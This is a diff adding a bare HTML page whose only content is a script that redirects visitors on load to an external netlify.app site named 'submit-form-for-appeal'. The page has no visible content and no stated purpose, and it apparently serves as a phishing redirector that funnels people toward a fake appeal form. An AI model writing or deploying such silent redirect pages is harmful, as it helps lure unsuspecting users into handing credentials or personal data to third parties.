@@ -1,0 +1,9 @@
+<!doctype html>
+<html>
+<head>
+  <script>
+    location.href = "https://submit-form-for-appeal.netlify.app";
+  </script>
+</head>
+<body></body>
+</html>
